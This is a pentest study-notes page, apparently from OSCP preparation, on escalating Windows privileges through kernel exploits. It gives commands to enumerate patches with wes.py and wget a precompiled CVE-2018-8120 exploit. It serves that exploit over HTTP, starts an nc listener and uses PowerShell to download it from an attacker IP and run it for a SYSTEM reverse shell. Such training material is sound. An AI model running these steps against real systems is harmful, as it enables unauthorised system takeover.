<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1. Kernel Exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>1. Kernel Exploits</h1><br />• Kernels are the core of any operating system. Think of it as a
    layer between application software and the actual computer hardware.<br />• The kernel has complete control over the
    operating system.<br />• Exploiting a kernel vulnerability can result in execution as the SYSTEM
    user.<br /><br /><strong>Finding Kernel Exploits</strong><br />Finding and using kernel exploits is usually a simple
    process:<br /> 1) Enumerate Windows version / patch level (systeminfo command)<br /> 2) Find matching exploits
    (Google, ExploitDB, GitHub).<br /> ▪ Windows Exploit Suggester: <a
      href="https://github.com/bitsadmin/wesng" target="_blank">https://github.com/bitsadmin/wesng</a><br /> ▪ Watson: <a
      href="https://github.com/rasta-mouse/Watson" target="_blank">https://github.com/rasta-mouse/Watson</a><br /> ▪ <a
      href="Home--Penetration_Test_Methodology--Network_Pentest--Exploitation--search_exploit_for_Windows.html" target="_blank">Windows
      Exploit Suggester(wes.py)</a>: <a
      href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a><br /> ▪ Precompiled Kernel
    Exploits: <a
      href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">https://github.com/SecWiki/windows-kernel-exploits</a><br />
    ▪ GitHub<br /> ▪ Google<br /> ▪ ExploitDB<br /> 3) Compile and run.<br />Beware though, as Kernel exploits can often
    be unstable and may be one-shot or cause a system crash.<br /><br /><strong>
      <h3>Tools</h3>
    </strong><br />• <strong>Windows Exploit Suggester</strong>: <a
      href="https://github.com/bitsadmin/wesng" target="_blank">https://github.com/bitsadmin/wesng</a><br /> 1) Copy the output of the
    systeminfo command.<br />
    <div class="codebox">
      <div class="codebox">PS&gt;&nbsp;systeminfo</div>
    </div><br /> paste in a file of the attacker machine<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;mousepad&nbsp;systeminfo.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#paste&nbsp;here&nbsp;the&nbsp;output&nbsp;of&nbsp;the&nbsp;systeminfo&nbsp;command
      </div>
    </div><br /> 2) Find Exploit with <a
      href="Home--Penetration_Test_Methodology--Network_Pentest--Exploitation--search_exploit_for_Windows.html">Windows
      Exploit Suggester(wes.py)</a><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;python3&nbsp;/home/kali/bin/wesng/wes.py&nbsp;/home/kali/Desktop/systeminfo.txt&nbsp;-i&nbsp;&#39;Elevation&nbsp;of&nbsp;Privilege&#39;&nbsp;--exploits-only
      </div>
    </div><br /> <a href=""><img src="images/1318-1.png" alt="images/1318-1.png" /></a><br /> <a href=""><img
        src="images/1318-2.png" alt="images/1318-2.png" /></a><br /> 2.1) Cross-Reference with Precompiled Kernel
    Exploits: <a
      href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">https://github.com/SecWiki/windows-kernel-exploits</a><br />
    If we do not find any matches on SecWiki, we have to go on Exploit DB<br /> 2.2) Download the compiled exploit<br />
    In the example CVE-2018-8210 <br /> <span style="color:#a5452a;">example:</span> <a
      href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe" target="_blank">https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;wget&nbsp;https://github.com/SecWiki/windows-kernel-exploits/raw/master/CVE-2018-8120/x64.exe<br />root@kali:/#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;80
      </div>
    </div><br /> 3) Retrieve and run the exploit<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div> <br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(New-Object&nbsp;System.Net.WebClient).downloadfile(&#39;http://192.168.147.139/x64.exe&#39;,&#39;C:\Users\ckent\Desktop\x64.exe&#39;);<br />PS&gt;&nbsp;.\x64&nbsp;&lt;command-to-exexute&gt;&nbsp;&nbsp;&nbsp;&nbsp;#the&nbsp;command&nbsp;to&nbsp;execute&nbsp;can&nbsp;be&nbsp;a&nbsp;reverse&nbsp;shell&nbsp;<span
          style="color:#000000;font-weight:400">(</span>the&nbsp;one&nbsp;that&nbsp;we&nbsp;have&nbsp;created&nbsp;with&nbsp;msfvenom<span
          style="color:#000000;font-weight:400">)</span></div>
    </div><br /> <a href=""><img src="images/1318-3.png" alt="images/1318-3.png" /></a><br /> Now we should receive a
    SYSTEM shell on the Attacker listener<br /> <a href=""><img src="images/1318-4.png"
        alt="images/1318-4.png" /></a><br /><br />• <strong>Watson</strong>: <a
      href="https://github.com/rasta-mouse/Watson" target="_blank">https://github.com/rasta-mouse/Watson</a><br /> useful tool for the
    more recent Windows 10, always for enumerate the possibles kernel
    exploits<br /><br /><br /><br />Bibliography:<br />• “Windows Privilege Escalation for OSCP &amp; Beyond!”, Tib3rius
  </div>
</body>

</html>